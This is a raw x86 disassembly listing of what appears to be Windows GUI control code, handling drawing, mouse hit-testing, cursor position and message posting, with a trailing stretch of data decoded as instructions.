retn
inc ebp
xor edi edi
inc edi
dec ebp
jne r-xdata
cmp [ esi + 0x15 ] 0x0
je r-xdata
mov edx edi
mov eax [ ebx + 0x228 ]
call sub_4143bc
mov esi eax
mov eax [ esi ]
cmp eax [ esp ]
jne r-xdata
mov edx esi
mov eax [ ebx + 0x228 ]
call sub_42fc44
jmp r-xdata
mov eax [ ebx + 0x228 ]
mov eax [ eax + 0x8 ]
dec eax
cmp edi eax
jge r-xdata
lea edx [ edi + 0x1 ]
mov eax [ ebx + 0x228 ]
call sub_4143bc
mov [ eax + 0x15 ] 0x1
sub_43148c
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi ] 0x0
jne r-xdata
cmp [ eax + 0x242 ] 0x0
je r-xdata
mov [ esi ] 0x1
pop esi
pop ebx
pop ebp
retn 0x8
push ecx
mov ecx [ ebp + 0xc ]
push ecx
push esi
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x244 ]
call [ ebx + 0x240 ]
sub_4314c8
push ebp
mov ebp esp
push ebx
push esi
mov ebx [ ebp + 0x8 ]
add ebx 0xffffffec
mov esi [ ebp + 0x8 ]
add esi 0xfffffffc
mov eax [ esi ]
mov eax [ eax + 0x10 ]
mov edx 0xff000014
call sub_41d6c0
mov ecx [ ebx + 0x4 ]
mov edx [ ebx ]
add edx 0x2
mov eax [ esi ]
call sub_41de78
mov ecx [ ebx + 0x4 ]
mov edx [ ebx ]
mov eax [ esi ]
call sub_41de18
mov ecx [ ebx + 0xc ]
inc ecx
mov edx [ ebx ]
mov eax [ esi ]
call sub_41de18
mov eax [ esi ]
mov eax [ eax + 0x10 ]
mov edx 0xff000010
call sub_41d6c0
mov ecx [ ebx + 0x4 ]
mov edx [ ebx + 0x8 ]
mov eax [ esi ]
call sub_41de78
mov ecx [ ebx + 0xc ]
mov edx [ ebx + 0x8 ]
mov eax [ esi ]
call sub_41de18
mov ecx [ ebx + 0xc ]
mov edx [ ebx ]
mov eax [ esi ]
call sub_41de18
pop esi
pop ebx
pop ebp
retn
sub_43154c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi [ ebp + 0x8 ]
mov dl [ r-xdata ]
mov [ ebp - 0x15 ] dl
push esi
lea edx [ ebp - 0x15 ]
push edx
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov ebx [ eax ]
call [ ebx + 0xd0 ]
test [ ebp - 0x15 ] 0x2
je r-xdata
test [ ebp - 0x15 ] 0x1
je r-xdata
push 0xf
push 0x4
push esi
mov eax [ ebp - 0x4 ]
call sub_41e234
push eax
call DrawEdge
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi + 0xc ]
sub eax 0x3
push eax
lea eax [ ebp - 0x14 ]
push eax
mov ebx [ esi ]
add ebx 0x3
mov ecx ebx
add ecx 0x2
mov edx [ esi + 0x4 ]
add edx 0x2
mov eax ebx
call sub_412f04
push ebp
call sub_4314c8
pop ecx
sub_4315c9
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
add esp 0xffffffe8
mov esi eax
cmp [ esi + 0x25a ] 0x0
je r-xdata
mov eax [ esi + 0x228 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov edx esi
mov eax [ esi + 0x25c ]
call [ esi + 0x258 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
inc eax
mov [ esp + 0x4 ] eax
mov [ esp ] 0x0
inc [ esp ]
dec [ esp + 0x4 ]
jne r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov edx [ esp ]
mov eax [ esi + 0x228 ]
call sub_4143bc
mov ebx eax
mov edi [ ebx ]
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
lea edx [ esp + 0x8 ]
mov eax edi
call sub_441ef0
lea eax [ ebx + 0x4 ]
mov edx [ eax ]
sub [ esp + 0x8 ] edx
mov edx [ eax + 0x4 ]
sub [ esp + 0xc ] edx
mov edx [ eax + 0x8 ]
add [ esp + 0x10 ] edx
mov eax [ eax + 0xc ]
add [ esp + 0x14 ] eax
lea eax [ esp + 0x8 ]
push eax
mov ecx edi
mov edx [ esi + 0x208 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0xdc ]
cmp [ edi + 0x57 ] 0x0
je r-xdata
sub_43168c
push ebx
push esi
push edi
add esp 0xffffffd8
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov esi eax
mov eax [ esi + 0x228 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
xor eax eax
mov [ esp + 0x8 ] eax
inc edi
mov [ esp + 0xc ] 0x0
inc [ esp + 0xc ]
dec edi
jne r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov eax [ esi + 0x228 ]
mov edx [ esp + 0xc ]
call sub_4143bc
mov [ esp + 0x8 ] eax
mov ebx [ esp + 0x8 ]
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
lea edx [ esp + 0x10 ]
mov eax [ ebx ]
call sub_441ef0
lea eax [ ebx + 0x4 ]
mov edx [ eax ]
sub [ esp + 0x10 ] edx
mov edx [ eax + 0x4 ]
sub [ esp + 0x14 ] edx
mov edx [ eax + 0x8 ]
add [ esp + 0x18 ] edx
mov eax [ eax + 0xc ]
add [ esp + 0x1c ] eax
lea ecx [ esp + 0x20 ]
mov edx [ esp + 0x4 ]
mov eax [ esp ]
call sub_412edc
push [ esp + 0x24 ]
push [ esp + 0x24 ]
lea eax [ esp + 0x18 ]
push eax
call PtInRect
test eax eax
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov eax [ esp + 0x8 ]
add esp 0x28
pop edi
pop esi
pop ebx
retn
sub_43174c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_449088
test al al
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_44561c
xor eax eax
push ebp
push sub_4317cb
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x90 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov dx [ r-xdata ]
not edx
and dx [ eax + 0x54 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x54 ] dx
mov eax [ ebp - 0x4 ]
call sub_445624
retn
sub_4317da
add [ eax ] al
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44855c
cmp [ esi + 0x4 ] 0x11
jne r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp [ ebx + 0x211 ] 0x0
je r-xdata
cmp [ ebx + 0x218 ] 0x0
je r-xdata
mov edx [ ebx + 0x218 ]
mov eax ebx
call sub_431b1c
test eax eax
je r-xdata
cmp [ eax ] 0x0
je r-xdata
mov esi eax
push esp
call GetCursorPos
push 0x1
lea eax [ esp + 0x4 ]
push eax
mov eax ebx
call sub_448d84
push eax
push 0x0
call MapWindowPoints
mov eax [ esp + 0x4 ]
push eax
push 0x1
mov edx [ esi ]
mov ecx [ esp + 0x8 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0xd4 ]
sub_431860
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
add esi 0xfffffffc
mov eax [ esi ]
mov eax [ eax + 0x228 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ esi ]
mov eax [ eax + 0x228 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ esi ]
xor edx edx
mov [ eax + 0x218 ] edx
mov eax [ esi ]
xor edx edx
mov [ eax + 0x214 ] edx
mov eax [ esi ]
xor edx edx
call sub_43174c
pop esi
pop ebx
pop ebp
retn
mov eax [ esi ]
mov eax [ eax + 0x228 ]
mov edx ebx
call sub_4143bc
call sub_402714
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_4318c4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x6 ] cl
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov esi [ ebp + 0xc ]
push esi
mov eax [ ebp + 0x8 ]
push eax
mov cl [ ebp - 0x6 ]
mov dl [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
call sub_443b64
mov eax [ ebp - 0x4 ]
call sub_442778
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
push ebp
call sub_431860
pop ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x218 ]
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_43168c
mov ebx eax
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_431b1c
mov ebx eax
jmp r-xdata
test [ ebp - 0x6 ] 0x40
je r-xdata
test ebx ebx
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebx ]
mov [ edx + 0x218 ] eax
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x214 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x211 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xe0 ]
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x214 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
test [ ebp - 0x6 ] 0x40
je r-xdata
lea ecx [ ebp - 0x10 ]
mov edx [ ebx + 0x3d ]
sub edx [ ebp + 0x8 ]
mov eax [ ebx + 0x39 ]
sub eax esi
call sub_412edc
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x21c ] edx
mov edx [ ebp - 0xc ]
mov [ eax + 0x220 ] edx
mov eax [ ebp + 0x8 ]
push eax
push 0x0
mov ecx esi
mov edx [ ebx ]
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xd4 ]
test al al
jne r-xdata
sub_4319d0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
call sub_443e1c
mov eax ebx
call sub_442778
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
mov eax [ ebx + 0x218 ]
test eax eax
je r-xdata
mov edx eax
mov eax ebx
call sub_431b1c
test eax eax
je r-xdata
mov esi eax
mov eax [ ebp - 0x8 ]
add eax [ ebx + 0x21c ]
mov [ esi + 0x16 ] eax
mov eax [ ebp + 0x8 ]
add eax [ ebx + 0x220 ]
mov [ esi + 0x1a ] eax
mov eax [ esi + 0x16 ]
mov [ esi + 0x39 ] eax
mov eax [ esi + 0x1a ]
mov [ esi + 0x3d ] eax
mov eax [ esi ]
mov eax [ eax + 0x48 ]
add eax [ esi + 0x4 ]
add eax [ esi + 0xc ]
mov [ esi + 0x44 ] eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov edx [ esi ]
mov eax ebx
call sub_43174c
cmp [ ebx + 0x211 ] 0x0
je r-xdata
mov eax [ esi ]
mov edi [ eax + 0x4c ]
mov eax edi
neg eax
cmp eax [ esi + 0x16 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
push eax
push 0x1
mov ecx [ ebp - 0x8 ]
mov edx [ esi ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0xd4 ]
test al al
jne r-xdata
mov eax edi
neg eax
cmp eax [ esi + 0x1a ]
jg r-xdata
mov eax ebx
call sub_441f54
add eax edi
cmp eax [ esi + 0x16 ]
jl r-xdata
mov eax ebx
call sub_441f98
add edi eax
cmp edi [ esi + 0x1a ]
jge r-xdata
sub_431ac4
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x1 ] cl
mov ebx edx
mov esi eax
mov eax [ esi + 0x218 ]
test eax eax
je r-xdata
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov cl [ ebp - 0x1 ]
mov edx ebx
mov eax esi
call sub_443ec4
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
xor edx edx
mov [ esi + 0x218 ] edx
cmp eax [ esi + 0x214 ]
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xe0 ]
xor eax eax
mov [ esi + 0x214 ] eax
jmp r-xdata
sub_431b1c
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x228 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
xor eax eax
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
cmp ebp [ eax ]
jne r-xdata
mov eax [ edi + 0x228 ]
mov edx ebx
call sub_4143bc
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov eax [ edi + 0x228 ]
mov edx ebx
call sub_4143bc
jmp r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
sub_431b68
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x1 ] 0x1
test ebx ebx
je r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
cmp [ eax + 0x23a ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
or ecx 0xffffffff
mov dl 0x1
mov eax ebx
call sub_442c10
lea edx [ ebp - 0x1 ]
push edx
mov esi eax
mov ecx ebx
mov edx eax
mov eax [ esi + 0x23c ]
call [ esi + 0x238 ]
sub_431bb4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov edi eax
mov ebx [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
push eax
push ebx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax edi
call sub_447764
cmp [ edi + 0x211 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
je r-xdata
test bl bl
jne r-xdata
cmp [ edi + 0x212 ] 0x0
je r-xdata
mov eax [ esi + 0x38 ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov eax [ esi + 0x38 ]
mov [ edi + 0x218 ] eax
mov dl 0x1
call sub_442cd4
mov ebx [ edi + 0x218 ]
mov dx [ ebx + 0x44 ]
mov ax [ ebx + 0x40 ]
call sub_406c04
push eax
push 0x1
push 0x201
mov eax edi
call sub_448d84
push eax
call PostMessageA
sub_431c44
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x4 ] ecx
mov esi eax
mov ebx [ ebp + 0x8 ]
lea eax [ ebp - 0xc ]
push eax
push ebx
mov ecx [ ebp - 0x4 ]
mov eax esi
call sub_447858
cmp [ ebx ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
cmp [ esi + 0x225 ] 0x0
je r-xdata
mov [ ebx ] al
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov al 0x1
sub_431cac
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x252 ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x8
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x254 ]
call [ ebx + 0x250 ]
sub_431d08
push ebx
push esi
push edi
push ebp
mov ebp eax
xor ebx ebx
mov eax [ ebp + 0x22c ]
mov esi [ eax + 0xc ]
cmp [ ebp + 0x57 ] 0x0
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebp + 0x1c ] 0x1
jne r-xdata
test esi esi
je r-xdata
cmp [ esi + 0x22 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
jne r-xdata
mov eax ebp
call sub_45a2f0
mov edi eax
test edi edi
je r-xdata
mov [ esi + 0x22 ] 0x0
jmp r-xdata
cmp [ edi + 0x22e ] 0x0
je r-xdata
mov eax edi
call sub_449088
test al al
je r-xdata
cmp [ ebp + 0x224 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x30f
mov eax edi
call sub_448d84
push eax
call PostMessageA
push 0x0
xor ecx ecx
mov edx 0x30f
mov eax edi
call sub_443750
jmp r-xdata
mov bl 0x1
mov [ esi + 0x22 ] 0x0
sub_431da0
push ebx
mov ebx eax
mov eax [ ebx + 0x22c ]
cmp [ eax + 0xc ] 0x0
je r-xdata
cmp [ ebx + 0x224 ] 0x0
jne r-xdata
mov eax ebx
call sub_431d08
test al al
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
cmp [ ebx + 0x224 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x88 ]
sub_431de0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_448498
cmp [ esi + 0x8 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x4 ]
cmp eax [ ebx + 0x218 ]
jne r-xdata
mov edx [ esi + 0x4 ]
mov eax ebx
call sub_431410
cmp [ ebx + 0x5c ] 0x0
je r-xdata
xor eax eax
mov [ ebx + 0x218 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
mov si 0xffee
call sub_403540
sub_431e30
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x218 ] 0x0
jne r-xdata
mov al 0x1
movsx ecx [ esi + 0xa ]
movsx edx [ esi + 0x8 ]
mov eax ebx
call sub_43167c
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
and eax 0x7f
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_431e64
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov edx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_41e2b4
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x70 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov eax [ eax + 0x14 ]
call sub_41d9c8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov eax [ eax + 0x14 ]
xor edx edx
call sub_41dae4
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_41dda0
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4471d8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
push ebp
push sub_431fc5
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x224 ]
mov [ ebp - 0x9 ] al
mov eax [ ebp - 0x4 ]
mov [ eax + 0x224 ] 0x1
xor eax eax
push ebp
push sub_431f8d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
call sub_4209c4
push eax
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
pop edx
mov ecx edx
cdq
idiv ecx
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_431f94
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x9 ]
mov [ eax + 0x224 ] dl
retn
inc eax
mov [ ebp - 0x10 ] eax
xor edi edi
inc edi
dec [ ebp - 0x10 ]
jne r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
call sub_4209dc
push eax
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
pop edx
mov ecx edx
cdq
idiv ecx
mov ebx eax
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
mov eax [ eax + 0xc ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
call sub_4209dc
imul esi
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
call sub_4209c4
mov edx eax
imul edx edi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
pop ecx
call sub_41dcc0
inc esi
dec ebx
jne r-xdata
sub_431f94
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor edx edx
call sub_41e2b4
sub_432024
inc esi
dec ecx
add [ esi ] dl
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add [ edi ] dl
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add [ eax ] bl
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add [ ecx ] bl
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add [ edx ] bl
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add [ ebx ] bl
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add [ edi + edi * 8 ] bl
add [ eax ] al
inc esi
dec ecx
add [ 0x640000ff ] bl
inc esi
dec ecx
add [ esi ] bl
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add [ edi ] bl
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add [ eax ] al
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add [ ecx ] al
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add [ edx ] al
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add [ ebx ] al
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add [ edi + edi * 8 ] al
add [ eax ] al
inc esi
dec ecx
add [ 0x640000ff ] al
inc esi
dec ecx
add [ esi ] al
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add [ edi ] al
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add [ eax ] cl
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add [ ecx ] cl
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add [ edx ] cl
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add [ ebx ] cl
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add [ edi + edi * 8 ] cl
add [ eax ] al
inc esi
dec ecx
add [ 0x640000ff ] cl
inc esi
dec ecx
add [ esi ] cl
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add [ edi ] cl
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add al dh
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add cl dh
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add dl dh
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add bl dh
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add ah dh
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add ch dh
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add dh dh
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add bh dh
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add al bh
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add cl bh
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add dl bh
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add bl bh
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add ah bh
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add ch bh
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add dh bh
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add bh bh
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add al ah
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add cl ah
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add dl ah
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add bl ah
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add ah ah
inc [ eax ]
add [ edi ] ch
add [ eax ] al
add ah cl
sub [ ecx ] ecx
xchg esp eax
and [ ebx ] eax
les ebp [ ecx ]
dec ecx
add [ ecx + 0x29bc0043 ] cl
dec ecx
add [ ecx + 0x29b40043 ] al
dec ecx
add [ ecx + 0x43 ] bh
add [ ecx + ebp + 0x21740049 ] ch
inc ebx
add [ ecx + ebp + 0x216c0049 ] ah
inc ebx
add [ ecx + ebp + 0x21640049 ] bl
inc ebx
add [ ecx + ebp + 0x215c0049 ] dl
inc ebx
add [ ecx + ebp + 0x21540049 ] cl
inc ebx
add [ ecx + ebp + 0x214c0049 ] al
inc ebx
add [ ecx + ebp + 0x49 ] bh
add [ ecx + 0x43 ] al
add [ ecx + ebp + 0x49 ] dh
add [ ecx ] bh
inc ebx
add [ ecx + ebp + 0x49 ] ch
add [ ecx ] dh
inc ebx
add [ ecx + ebp + 0x49 ] ah
add [ ecx ] ch
inc ebx
add [ ecx + ebp + 0x49 ] bl
add [ ecx ] ah
inc ebx
add [ ecx + ebp + 0x49 ] dl
add [ ecx ] bl
inc ebx
add [ ecx + ebp + 0x49 ] cl
add [ ecx ] dl
inc ebx
add [ ecx + ebp + 0x49 ] al
add [ ecx ] cl
inc ebx
add [ ecx + ebp ] bh
dec ecx
add [ ecx ] al
inc ebx
add [ ecx + ebp ] dh
dec ecx
add ah bh
and [ ebx ] al
sub al 0x29
dec ecx
add ah dh
and [ ebx ] al
and al 0x29
dec ecx
add ah ch
and [ ebx ] al
sbb al 0x29
dec ecx
add ah ah
and [ ebx ] al
adc al 0x29
dec ecx
add ah bl
and [ ebx ] al
or al 0x29
dec ecx
add ah dl
and [ ebx ] al
add al 0x29
dec ecx
add ah cl
and [ ebx ] al
cld
sub [ ecx ] cl
les esp [ eax ]
inc ebx
add ah dh
sub [ ecx ] cl
mov esp 0xec004320
sub [ ecx ] cl
mov ah 0x20
inc ebx
add ah ah
sub [ ecx ] cl
lodsb [ esi ]
and [ ebx ] al
fsubr [ eax ]
dec ecx
add [ eax + 0x28d40043 ] ah
dec ecx
add [ eax + 0x28cc0043 ] bl
dec ecx
add [ eax + 0x28c40043 ] dl
dec ecx
add [ eax + 0x28bc0043 ] cl
dec ecx
add [ eax + 0x28b40043 ] al
dec ecx
add [ eax + 0x43 ] bh
add [ eax + ebp + 0x20740049 ] ch
inc ebx
add [ eax + ebp + 0x206c0049 ] ah
inc ebx
add [ eax + ebp + 0x20640049 ] bl
inc ebx
add [ eax + ebp + 0x205c0049 ] dl
inc ebx
add [ eax + ebp + 0x20540049 ] cl
inc ebx
add [ eax + ebp + 0x204c0049 ] al
inc ebx
add [ eax + ebp + 0x49 ] bh
add [ eax + 0x43 ] al
add [ eax + ebp + 0x49 ] dh
add [ eax ] bh
inc ebx
add [ eax + ebp + 0x49 ] ch
add [ eax ] dh
inc ebx
add [ eax + ebp + 0x49 ] ah
add [ eax ] ch
inc ebx
add [ eax + ebp + 0x49 ] bl
add [ eax ] ah
inc ebx
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_432354
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43235b
retn
mov eax rw-data
mov ecx 0x2f
mov edx [ r-xdata ]
call sub_404b1c
sub_432390
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4323b5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4323bc
retn
sub_4323f5
xor eax 0x35980040
inc eax
add [ ebp + esi + 0x35a00040 ] bl
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
inc eax
add al bh
xor al [ eax ]
pushfd
sub [ ebx ] eax
daa
inc ebx
add [ eax - 0x2bffbeb6 ] ah
sub [ ebx ] al
dec eax
and eax 0x24600043
inc ebx
add al al
